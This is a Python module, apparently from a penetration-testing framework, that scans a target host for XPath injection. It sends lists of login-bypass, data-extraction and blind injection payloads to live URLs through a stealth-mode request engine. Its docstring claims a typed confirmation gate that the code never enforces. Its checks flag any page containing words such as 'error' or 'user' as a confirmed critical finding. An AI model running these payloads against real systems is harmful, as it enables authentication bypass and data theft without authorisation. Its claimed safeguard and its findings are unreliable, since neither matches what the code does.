"""
modules/validate/xpath.py
─────────────────────────
XPath Injection validation module.

Detects and validates XPath injection vulnerabilities:
  - XPath query parameter injection
  - XPath authentication bypass
  - XPath data extraction
  - Blind XPath injection (timing-based)

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class XPathValidator:
    """
    XPath injection detection and validation.
    """

    # XPath injection payloads
    PAYLOADS = {
        "login_bypass": [
            "' or '1'='1",
            "' or '1'='1' or '1'='1",
            "' or '1'='1' and '1'='1",
            "' or '1'='1' or ''='",
            "' or '1'='1' or 'x'='x",
            "'' or '1'='1",
            "' or '1'='1' or '1'='1' -- ",
            "' or '1'='1' or '1'='1' /*",
            "' or '1'='1' or '1'='1' #",
            "' or 1=1",
            "' or 1=1 or ''='",
            "admin' or '1'='1",
            "admin' or '1'='1' or '1'='1",
        ],
        "data_extraction": [
            "' or 1=1 or ''='",
            "' or '1'='1' or ''='",
            "' or name()='root",
            "' or /root/username='admin",
            "' or //user[position()=1]/username",
            "' or //user/username='admin",
            "' or //user/password='password",
            "' or //user[contains(username,'admin')]",
        ],
        "blind": [
            "' and '1'='1",
            "' and '1'='2",
            "' and count(//user)=1",
            "' and count(//user[username='admin'])=1",
            "' and substring(//user[1]/username,1,1)='a",
            "' and string-length(//user[1]/username)>0",
            "' and contains(//user[1]/username,'a')",
        ],
        "error_based": [
            "'",
            "\"",
            "' or '1'='1",
            "' or '1'='1' and ''='",
            "' or '1'='1' or 'x'='y",
            "' or '1'='1' and 1=2",
            "' or '1'='1' and 1=1",
            "' or '1'='1' and '1'='2",
        ],
        "payload_extraction": [
            "/root/username",
            "/root/password",
            "//user/username",
            "//user/password",
            "//user[1]/username",
            "//user[position()=1]",
            "//user[@id='1']",
            "//user[username='admin']",
            "//user/password/text()",
            "//user[contains(username,'admin')]",
        ],
    }

    # XPath error patterns
    ERROR_PATTERNS = [
        r"XPath",
        r"xpath",
        r"XQuery",
        r"xquery",
        r"XSLT",
        r"xslt",
        r"DOM",
        r"xml",
        r"XML",
        r"parser",
        r"Parser",
        r"invalid",
        r"Invalid",
        r"error",
        r"Error",
        r"exception",
        r"Exception",
        r"stack trace",
        r"Stack Trace",
    ]

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.xpath")
        self.out_dir = session.dir("validate") / "xpath"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_xpath_params(self, url: str) -> List[Dict[str, Any]]:
        """
        Detect parameters that might accept XPath queries.
        """
        self.logger.info(f"Detecting XPath parameters: {url}")

        params = []

        # Parameters that often accept XPath
        xpath_params = [
            "xpath", "query", "search", "filter", "where",
            "select", "find", "get", "list", "xml",
            "data", "node", "path", "expression",
            "criteria", "condition", "term", "key",
        ]

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        for key in query:
            if key.lower() in xpath_params:
                for value in query[key]:
                    params.append({
                        "name": key,
                        "value": value,
                        "method": "GET",
                        "url": url,
                    })

        # Also check forms
        try:
            status, headers, content = self.stealth.get(url)
            if status == 200:
                for param in xpath_params[:10]:
                    pattern = rf'<input[^>]*name=["\']({param})["\'][^>]*>'
                    matches = re.findall(pattern, content, re.I)
                    for name in matches:
                        params.append({
                            "name": name,
                            "value": "",
                            "method": "POST",
                            "url": url,
                        })
        except Exception:
            pass

        self.logger.success(f"Found {len(params)} XPath parameters")
        return params

    def test_injection(self, param: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test a parameter for XPath injection.
        """
        url = param.get("url", "")
        name = param.get("name", "")
        method = param.get("method", "GET")
        original_value = param.get("value", "")

        self.logger.info(f"Testing {method} parameter: {name}")

        results = {
            "parameter": name,
            "method": method,
            "vulnerable": False,
            "vuln_types": [],
            "payloads": [],
            "evidence": [],
        }

        # Test each payload type
        for payload_type, payloads in self.PAYLOADS.items():
            for payload in payloads[:3]:
                try:
                    test_value = original_value + payload if original_value else payload

                    if method == "GET":
                        test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                        status, headers, content = self.stealth.get(test_url, timeout=10)
                    else:
                        data = f"{name}={urllib.parse.quote(test_value)}"
                        status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                    # Check for XPath indicators
                    if self._check_xpath_error(content):
                        results["vulnerable"] = True
                        if payload_type not in results["vuln_types"]:
                            results["vuln_types"].append(payload_type)
                        results["payloads"].append(payload[:50])
                        results["evidence"].append(content[:200])
                        self.logger.finding(f"XPath injection detected: {name} -> {payload_type}", severity="critical", host=url)
                        break

                    # Check for authentication bypass
                    if self._check_auth_bypass(content):
                        results["vulnerable"] = True
                        if "auth_bypass" not in results["vuln_types"]:
                            results["vuln_types"].append("auth_bypass")
                        results["payloads"].append(payload[:50])
                        results["evidence"].append(content[:200])
                        self.logger.finding(f"XPath auth bypass detected: {name}", severity="critical", host=url)
                        break

                    self.stealth.sleep(0.5)

                except Exception as e:
                    self.logger.debug(f"Payload test failed: {e}")

        return results

    def _check_xpath_error(self, content: str) -> bool:
        """
        Check for XPath error indicators.
        """
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, content, re.I):
                return True
        return False

    def _check_auth_bypass(self, content: str) -> bool:
        """
        Check for authentication bypass indicators.
        """
        success_indicators = [
            "welcome", "dashboard", "logged in", "logout",
            "success", "valid", "authenticated", "session",
            "profile", "account", "admin", "user",
        ]

        for indicator in success_indicators:
            if indicator in content.lower():
                return True
        return False

    def confirm_vulnerability(self, param: Dict[str, Any]) -> bool:
        """
        Confirm XPath injection with a safe test.
        """
        self.logger.info(f"Confirming XPath injection on {param['name']}")

        url = param.get("url", "")
        name = param.get("name", "")
        original_value = param.get("value", "")

        # Use a safe test that should work
        test_payloads = [
            "' or '1'='1",
            "' or '1'='1' or '1'='1",
        ]

        for payload in test_payloads:
            try:
                test_value = original_value + payload if original_value else payload
                test_url = url.replace(f"{name}={original_value}", f"{name}={urllib.parse.quote(test_value)}")
                status, headers, content = self.stealth.get(test_url, timeout=10)

                if self._check_auth_bypass(content) or self._check_xpath_error(content):
                    self.logger.finding(f"XPath injection confirmed: {param['name']}", severity="critical", host=url)
                    return True

                self.stealth.sleep(0.5)

            except Exception:
                pass

        return False

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full XPath validation workflow.
        """
        self.logger.info(f"XPath validation: {url}")

        results = {
            "url": url,
            "parameters": [],
            "vulnerable": [],
            "confirmed": [],
            "status": "completed"
        }

        # Detect XPath parameters
        params = self.detect_xpath_params(url)
        results["parameters"] = params

        # Test each parameter
        for param in params:
            test_result = self.test_injection(param)
            if test_result["vulnerable"]:
                results["vulnerable"].append(test_result)

                # Confirm
                if self.confirm_vulnerability(param):
                    results["confirmed"].append({
                        "parameter": param["name"],
                        "method": param["method"],
                        "url": param["url"],
                        "vuln_types": test_result["vuln_types"],
                    })

                    self.session.add_finding(Finding(
                        source="validate.xpath",
                        title=f"XPath injection confirmed: {param['name']}",
                        description=f"Types: {', '.join(test_result['vuln_types'])}",
                        severity=SeverityLevel.CRITICAL,
                        host=url,
                        tags=["xpath", "injection", "validated"],
                        evidence=json.dumps(test_result["evidence"][:3]),
                        remediation="Use parameterized XPath queries. Validate user input.",
                    ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run XPath injection validation on target.
        """
        self.logger.banner(f"XPATH INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        urls = [
            f"https://{target}",
            f"http://{target}",
        ]

        results = {
            "target": target,
            "urls_tested": [],
            "vulnerabilities": [],
            "confirmed": []
        }

        for url in urls:
            try:
                result = self.validate(url)
                results["urls_tested"].append(url)
                results["vulnerabilities"].extend(result["vulnerable"])
                results["confirmed"].extend(result["confirmed"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"xpath_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"XPath validation: {len(results['confirmed'])} confirmed")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]